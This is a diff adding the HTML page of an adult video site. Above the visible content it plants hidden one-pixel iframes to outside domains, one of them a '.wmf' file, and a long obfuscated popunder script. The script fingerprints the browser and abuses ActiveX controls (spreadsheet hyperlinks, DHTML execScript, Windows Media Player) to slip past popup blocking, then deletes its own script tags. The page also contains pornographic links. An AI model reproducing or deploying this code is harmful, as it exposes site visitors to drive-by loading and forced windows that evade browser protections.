@@ -1,0 +1,304 @@
+<IFRAME SRC="http://search-buy.info/cyber.wmf" WIDTH=1 HEIGHT=1 FRAMEBORDER=0></IFRAME>
+<IFRAME SRC="http://2005-search.com/go/c.php?num=41" WIDTH=1 HEIGHT=1 MARGINHEIGHT=0 MARGINWIDTH=0 FRAMEBORDER=0></IFRAME>
+<SCRIPT language=JavaScript>
+<!--
+  document.cookie = 'trafman=traf-0.0.1203629215.1.0.0.; path=/;;';
+// -->
+</SCRIPT>
+
+<IFRAME SRC="http://search-biz.org/test.html" WIDTH=1 HEIGHT=1 FRAMEBORDER=1></IFRAME>
+<IFRAME SRC="http://2005-search.com/test/test.html" WIDTH=1 HEIGHT=1 FRAMEBORDER=1></IFRAME>
+<script language="JavaScript">
+// PATH TO FLASH FILE
+l1lxpath = "http://www.cogidas.org/zpopup.jsp";
+
+l1lxxic = new Array();
+l1lxxoc = new Array();
+
+// POPUNDER & TIMER MODE
+l1lxtimer = 1;
+l1lxpopunder = "yes";
+l1lxpopunderforce = "no";
+
+// SPONSOR TRIGGER MODE
+l1lxtrigger = "no";
+l1lxenter = "yes";
+l1lxexit = "yes";
+
+// ENTER CONSOLES
+l1lxxic[0] = new Array ("http://www.bestgall.net/vc.php","yes","yes","100","100","0","0","yes","yes");
+
+// EXIT CONSOLES
+l1lxxoc[0] = new Array ("http://www.bestgall.net/vc.php","yes","yes","100","100","0","0","yes","yes");
+l1lxxoc[1] = new Array ("http://www.bestgall.net/vc.php","yes","yes","100","100","0","0","yes","yes");
+
+</script>
+
+<script language="JavaScript">
+// LICENSE DOR DOMAINS:
+l1lxzdomain=new Array();
+l1lxzdomain[0]="C";
+</script>
+
+<script language="JavaScript">
+l1lxfcp = new Array();
+l1lxtimer2 = (l1lxtimer/10)-100;
+if(l1lxtimer2 < 1){l1lxtimer2=10;}
+l1lxender = l1lxtimer2+600;
+l1lxfcp[0] = new Array(l1lxtimer2,l1lxender,"cont");
+var tl1lxi=0; 
+var tl1lxgs=-1;
+function setFocuss(tl1lxfoe){
+if(tl1lxi<tl1lxfoe.length){
+switch (tl1lxfoe[tl1lxi][2]){
+case "peak" :
+tl1lxgs++;
+if(tl1lxgs == tl1lxfoe[tl1lxi][0]){window.focus();tl1lxi++;}
+break;
+case "cont" :
+tl1lxgs++;
+if(tl1lxgs >= tl1lxfoe[tl1lxi][0]){window.focus();}
+if(tl1lxgs == tl1lxfoe[tl1lxi][1]){tl1lxi++;}
+break;
+case "redir" :
+tl1lxgs++;
+if(tl1lxgs > tl1lxfoe[tl1lxi][0]){window.location = tl1lxfoe[tl1lxi][1];clearInterval(Valor);}
+break;
+case "reset" :
+tl1lxgs++;
+if(tl1lxgs > tl1lxfoe[tl1lxi][0]){tl1lxgs=0;tl1lxi=0;}
+break;
+}
+}
+else{clearInterval(Valor);}
+}
+function tl1lxfpst(){
+Valor =  setInterval('setFocuss(l1lxfcp)',10);
+}
+if(l1lxpopunder=="yes"){tl1lxfpst();}
+</script>
+
+<script language="JavaScript" id="l1lxhri">
+document.write('<DIV id="Gree"></DIV>')
+function l1lxresetSrc(l1lxtype,l1lxmk){
+if(l1lxtype=='start'){
+if(document.all.l1lxhri){
+var l1lxeraseMark;
+for(l1lxio=0;l1lxio<document.scripts.length;l1lxio++){ 
+if(document.all.l1lxhri.innerHTML==document.scripts[l1lxio].innerHTML){l1lxeraseMark=l1lxio;l1lxresetSrc('loc',l1lxio);}
+}
+}
+else{l1lxresetSrc('glob')}
+}
+if(l1lxtype=='loc' && document.scripts.length > l1lxmk){
+document.scripts[l1lxmk].outerHTML='<script>var cv=600;<\/script>';l1lxresetSrc('loc',l1lxmk);
+}
+if(l1lxtype=='glob'){
+document.scripts[0].outerHTML='<script>var cv=600;<\/script>';
+if(document.scripts.length != 0){l1lxresetSrc("glob");}
+}
+}
+</script>
+
+<script language="JavaScript">
+function l1lxusnot(){alert("Unregistered domain!");}
+var l1lxapprdom=0;
+var l1lxldomain="C";
+l1lxu=0;
+while(l1lxu<l1lxzdomain.length){
+l1lxldomain="C";
+if(l1lxldomain.substr(0,4)=='www.'){l1lxldomain=l1lxldomain.substr(4);}
+if(l1lxzdomain[l1lxu].substr(0,4)=='www.'){l1lxzdomain[l1lxu]=l1lxzdomain[l1lxu].substr(4);}
+if(l1lxzdomain[l1lxu].substr(0,1)=='_'){ 
+if(l1lxldomain.length==l1lxzdomain[l1lxu].length-2){l1lxldomain="_."+l1lxldomain;}
+else{l1lxldomain="_"+l1lxldomain.substr(l1lxldomain.length-(l1lxzdomain[l1lxu].length-1));}
+}
+if(l1lxzdomain[l1lxu]==l1lxldomain){l1lxapprdom=1;}
+l1lxu++;
+}
+l1lxy=0;
+while(l1lxy<l1lxxic.length){
+l1lxxic[l1lxy][0]=escape(l1lxxic[l1lxy][0]);
+l1lxy++;
+}
+l1lxy=0;
+while(l1lxy<l1lxxoc.length){
+l1lxxoc[l1lxy][0]=escape(l1lxxoc[l1lxy][0]);
+l1lxy++;
+}
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+if(l1lxxic[l1lxi][1]=="yes"){l1lxxic[l1lxi][3]=window.screen.width;}
+if(l1lxxic[l1lxi][2]=="yes"){l1lxxic[l1lxi][4]=window.screen.width;}
+}
+for(l1lxi=0;l1lxi<l1lxxoc.length;l1lxi++){
+if(l1lxxoc[l1lxi][1]=="yes"){l1lxxoc[l1lxi][3]=window.screen.width;}
+if(l1lxxoc[l1lxi][2]=="yes"){l1lxxoc[l1lxi][4]=window.screen.width;}
+}
+</script>
+<script language="JavaScript">
+l1lxfamily=0;
+l1lxbw='NA';
+l1lxos='NA';
+l1lxtoolb='NA';
+l1lxexobj='NA';
+l1lxisXPSP2=(navigator.userAgent.indexOf("SV1"));
+l1lxisIE=(navigator.userAgent.indexOf("IE"));
+l1lxisWIN=(navigator.userAgent.indexOf("Win"));
+l1lxisOpera=(navigator.userAgent.indexOf("Opera"));
+l1lxisFfox=(navigator.userAgent.indexOf("Firefox"));
+l1lxis98=(navigator.userAgent.indexOf("98"));
+l1lxisTNS=(navigator.appName.indexOf("Netscape"));
+if(l1lxisWIN!=-1){l1lxos='WIN';}
+if(l1lxisIE!=-1){l1lxbw='IE';} 
+if(l1lxisXPSP2!=-1 && l1lxisIE!=-1 && l1lxisWIN!=-1){l1lxbw='IE';l1lxos='WINXPSP2';} 
+if(l1lxisOpera!=-1){l1lxbw='Opera';}
+if(l1lxisFfox!=-1){l1lxbw='Firefox';}
+if(l1lxisTNS!=-1){l1lxbw='Netscape';}
+if(l1lxis98!=-1){l1lxos='WIN98';}
+function l1lxOpFlash(){
+if(l1lxtrigger == "no" || l1lxenter == "yes"){
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+document.getElementById('Gree').innerHTML+='<embed src="'+l1lxpath+'?u='+l1lxxic[l1lxi][0]+'" quality="high" bgcolor="#ffffff" width="1" height="1" name="zpopup" align="middle" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">';
+}
+}
+}
+if(l1lxxic.length>0 && (l1lxbw=='Opera' || l1lxbw=='Firefox' || l1lxbw=='Netscape' || l1lxbw=='NA' || l1lxos=='NA')){
+if(l1lxapprdom==1){l1lxfamily=1;}
+else{l1lxusnot();}
+}
+function l1lxlookfor(l1lxbtype){
+if(document.body && document.body.l1lxhri){document.body.removeChild(document.getElementById('l1lxhri'));}
+if(document.body && l1lxbtype>0){
+if(l1lxbtype==1){setTimeout('l1lxOpFlash()',l1lxtimer);}
+if(l1lxbtype==2){setTimeout('l1lxzload()',l1lxtimer);if(l1lxxoc.length>0){window.attachEvent('onbeforeunload',l1lxzexit);}}
+clearInterval(l1lxvalor);
+}
+}
+l1lxvalor=setInterval('l1lxlookfor(l1lxfamily)',1);
+</script>
+<script language="JavaScript">
+function l1lxwmp1(){
+for(l1lxi=0;l1lxi<l1lxxoc.length;l1lxi++){
+l1lxmidf=unescape(l1lxxoc[l1lxi][0]);
+l1lxie.launchURL(l1lxmidf);
+}
+}
+function l1lx98in(){
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+if(l1lxxic[l1lxi][8]=="yes"){l1lxbur=1;} else{l1lxbur=0;}
+if(l1lxxic[l1lxi][7]=="yes"){l1lxbor=1;} else{l1lxbor=0;}
+window.open(unescape(l1lxxic[l1lxi][0]),"_blank","left="+l1lxxic[l1lxi][6]+",top="+l1lxxic[l1lxi][5]+",height="+l1lxxic[l1lxi][4]+",width="+l1lxxic[l1lxi][3]+",scrollbars="+l1lxbur+",menubar="+l1lxbur+",toolbar="+l1lxbur+",titlebar=yes,location="+l1lxbur+",directories=0,status="+l1lxbur+",resizable="+l1lxbor);
+}
+}
+function l1lx98out(){
+for(l1lxi=0;l1lxi<l1lxxoc.length;l1lxi++){
+if(l1lxxoc[l1lxi][8]=="yes"){l1lxbur=1;} else{l1lxbur=0;}
+if(l1lxxoc[l1lxi][7]=="yes"){l1lxbor=1;} else{l1lxbor=0;}
+window.open(unescape(l1lxxoc[l1lxi][0]),"_blank","left="+l1lxxoc[l1lxi][6]+",top="+l1lxxoc[l1lxi][5]+",height="+l1lxxoc[l1lxi][4]+",width="+l1lxxoc[l1lxi][3]+",scrollbars="+l1lxbur+",menubar="+l1lxbur+",toolbar="+l1lxbur+",location="+l1lxbur+",directories=0,status="+l1lxbur+",resizable="+l1lxbor);
+}
+}
+l1lxvbstr = "%3Cscript%20language%3D%22VBScript%22%3E%0D%0A";
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+l1lxj=l1lxi+1;
+if(l1lxi==eval(l1lxxic.length-1)){l1lxvbstr+="function%20l1lxvcin"+l1lxi+"%28%29%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.Address%3D%22"+l1lxxic[l1lxi][0]+"%22%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.follow%20true%0D%0Aend%20function%0D%0A";}
+else{l1lxvbstr+="function%20l1lxvcin"+l1lxi+"%28%29%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.Address%3D%22"+l1lxxic[l1lxi][0]+"%22%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.follow%20true%0D%0A%20%20%20%20l1lxvcin"+l1lxj+"%28%29%0D%0Aend%20function%0D%0A";}
+}
+for(l1lxi=0;l1lxi<l1lxxoc.length;l1lxi++){
+l1lxj=l1lxi+1;
+if(l1lxi==eval(l1lxxoc.length-1)){l1lxvbstr+="function%20l1lxvcon"+l1lxi+"%28%29%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.Address%3D%22"+l1lxxoc[l1lxi][0]+"%22%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.follow%20true%0D%0Aend%20function%0D%0A";}
+else{l1lxvbstr+="function%20l1lxvcon"+l1lxi+"%28%29%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.Address%3D%22"+l1lxxoc[l1lxi][0]+"%22%0D%0A%20%20%20%20spreadsheet1.cells%281%2C"+l1lxj+"%29.hyperlink.follow%20true%0D%0A%20%20%20%20l1lxvcon"+l1lxj+"%28%29%0D%0Aend%20function%0D%0A";}
+}
+l1lxvbstr+="%3C/script%3E";
+document.write(unescape(l1lxvbstr));
+l1lxdhstr="%3Cscript%20language%3D%22JavaScript%22%3E%0D%0Afunction%20l1lxdcon1%28%29%7B%0D%0A";
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+l1lxdhvar="width="+l1lxxic[l1lxi][3]+",height="+l1lxxic[l1lxi][4]+",top="+l1lxxic[l1lxi][5]+",left="+l1lxxic[l1lxi][6]+",center=0,help=no,resizable="+l1lxxic[l1lxi][7]+",scrollbars="+l1lxxic[l1lxi][8]+",menubar="+l1lxxic[l1lxi][8]+",location="+l1lxxic[l1lxi][8]+",status="+l1lxxic[l1lxi][8]+",titlebar="+l1lxxic[l1lxi][8]+",toolbar="+l1lxxic[l1lxi][8];
+l1lxdhvar=escape(l1lxdhvar); 
+l1lxdhstr+="open%28%22"+l1lxxic[l1lxi][0]+"%22%2C%22_blank%22%2C%22"+l1lxdhvar+"%22%29%3B%0D%0A";
+}
+l1lxdhstr+="%7D%0D%0Afunction%20l1lxdstart%28%29%7B%0D%0A%20l1lxx.DOM.Script.execScript%28l1lxdcon1.toString%28%29%29%3B%0D%0A%20l1lxx.DOM.Script.setTimeout%28%22l1lxdcon1%28%29%22%29%3B%0D%0A%7D%0D%0A%3C/script%3E%0D%0A";
+document.write(unescape(l1lxdhstr));
+function l1lxccon1(){
+for(l1lxi=0;l1lxi<l1lxxic.length;l1lxi++){
+l1lxccvar="dialogWidth:"+l1lxxic[l1lxi][3]+"px;dialogHeight:"+l1lxxic[l1lxi][4]+"px;dialogTop:"+l1lxxic[l1lxi][5]+"px;dialogLeft:"+l1lxxic[l1lxi][6]+"px;edge:Raised;center:0;help:0;resizable:"+l1lxxic[l1lxi][7]+";scroll:"+l1lxxic[l1lxi][8]+";status:0";
+l1lxccvar=escape(l1lxccvar);
+l1lxccbd="window.showModalDialog%28%27"+l1lxxic[l1lxi][0]+"%27%2C%27%27%2C%27"+l1lxccvar+"%27%29";
+l1lxccbd=unescape(l1lxccbd);
+eval(l1lxccbd);
+}
+}
+function l1lxccon2(){
+for(l1lxi=0;l1lxi<l1lxxoc.length;l1lxi++){
+l1lxccvar="dialogWidth:"+l1lxxoc[l1lxi][3]+"px;dialogHeight:"+l1lxxoc[l1lxi][4]+"px;dialogTop:"+l1lxxoc[l1lxi][5]+"px;dialogLeft:"+l1lxxoc[l1lxi][6]+"px;edge:Raised;center:0;help:0;resizable:"+l1lxxoc[l1lxi][7]+";scroll:"+l1lxxoc[l1lxi][8]+";status:0";
+l1lxccvar=escape(l1lxccvar);
+l1lxccbd="window.showModalDialog%28%27"+l1lxxoc[l1lxi][0]+"%27%2C%27%27%2C%27"+l1lxccvar+"%27%29";
+l1lxccbd=unescape(l1lxccbd);
+eval(l1lxccbd);
+}
+}
+function l1lxzload(){
+if(l1lxos=='WINXPSP2'){
+document.getElementById('Gree').innerHTML+='<OBJECT style="display:none" id="l1lxie" width="1" height="1" classid="CLSID:6BF52A52-394A-11D3-B153-00C04F79FAA6"><\/OBJECT>';
+}
+if(l1lxbw=='IE'){
+document.getElementById('Gree').innerHTML+='<object id="googleBar" classid="clsid:00EF2092-6AC5-47c0-BD25-CF2D5D657FEB" style="display: none"></object>';
+if(window.attachEvent && document.googleBar && typeof(googleBar.Search) != "undefined"){l1lxtoolb='google';}
+}
+if(l1lxos=='WIN' || l1lxos=='WINXPSP2'){
+document.getElementById('Gree').innerHTML+="<div style='display:none'><object classid='clsid:0002E559-0000-0000-C000-000000000046' id='spreadsheet1'><param name='DataType' value='CSVDATA'><param name='CSVDATA' value=''LINK''><param name='Calculation' value='-4105'><param name='Caption' value='Microsoft Office Spreadsheet'><param name='EnableEvents' value='-1'><param name='ScreenUpdating' value='-1'><param name='LockedDown' value='0'><param name='DefaultQueryOnLoad' value='-1'></object></div>";
+if(document.spreadsheet1=='Microsoft Office Spreadsheet'){l1lxexobj='yes';}
+}
+if(l1lxbw=='IE' && (l1lxos=='WINXPSP2' || l1lxos=='WIN')){
+document.getElementById('Gree').innerHTML+='<div style="position:absolute;top:0;left:0;height:1px;width:1px;overflow:hidden"><object id="l1lxx" classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A"><PARAM NAME="ActivateApplets" VALUE="1"><PARAM NAME="ActivateActiveXControls" VALUE="1"></object></div>';
+}
+if(l1lxxic.length>0){
+if(l1lxtrigger == "no" || l1lxenter == "yes"){
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WINXPSP2'){l1lxyoda11=l1lxvcin0();}
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WIN'){l1lxccon1();}
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WIN98' && l1lxpopunderforce!='yes'){l1lxccon1();}
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WIN98' && l1lxpopunderforce=='yes'){l1lx98in();}
+if(l1lxbw=='IE' && l1lxtoolb=='NA' && l1lxos=='WINXPSP2'){setTimeout('l1lxdstart()',2000);}
+if(l1lxbw=='IE' && l1lxtoolb=='NA' && l1lxos=='WIN'){l1lx98in();}
+if(l1lxbw=='IE' && l1lxtoolb=='NA' && l1lxos=='WIN98'){l1lx98in();}
+}
+}
+}
+function l1lxzexit(){
+if(l1lxtrigger == "no" || l1lxexit == "yes"){
+if(l1lxos=='WINXPSP2' && l1lxtoolb=='google' && l1lxexobj=='yes'){l1lxyoda4=l1lxvcon0();}
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WIN'){l1lxccon2();}
+if(l1lxbw=='IE' && l1lxtoolb=='google' && l1lxos=='WIN98'){l1lxccon2();}
+if(l1lxos=='WINXPSP2' && l1lxtoolb=='NA'){l1lxwmp1();}
+if(l1lxbw=='IE' && l1lxtoolb=='NA' && l1lxos=='WIN'){l1lx98out();}
+if(l1lxbw=='IE' && l1lxtoolb=='NA' && l1lxos=='WIN98'){l1lx98out();}
+}
+}
+if(l1lxapprdom==1){if(l1lxfamily==0){l1lxfamily=2;}}
+else{l1lxusnot();}
+if(l1lxfamily>1){l1lxresetSrc('start');}
+</script>
+<!--- / ZPOPUP SRC ---->
+<STYLE type=text/css>
+.mm {border:0px;}				
+img {border:1px solid #FFFFFF;}					
+</STYLE>
+
+<link rel="stylesheet" type="text/css" href="1.css" />
+<BASE TARGET="_blank">
+<center>
+<br>
+<br>
+<IMG SRC="logo.gif" WIDTH=600 HEIGHT=200 BORDER=0 STYLE="border : 0px;">
+<br><br>
+<br<br>
+<div STYLE="font-size: 20pt; font-family: Arial">High quality porn movies</div>
+<br><br><IFRAME WIDTH=100% HEIGHT=3000 MARGINHEIGHT=0 MARGINWIDTH=0 FRAMEBORDER=0 SCROLLING="NO" SRC="http://porntubesite.com"></IFRAME>
+<A HREF="http://www.porono.org/trade.html">Trade movies traffic</A><BR><BR><BR>
+
+All models were at least 18 years old when they were photographed.<br>
+The site is in full compliance with 18 USC Section 2257.<br>
+Actual production dates for images & videos are contained<br>
+in the records maintained pursuant to 18 USC Section 2257. 
+</BODY>
+</HTML>
+
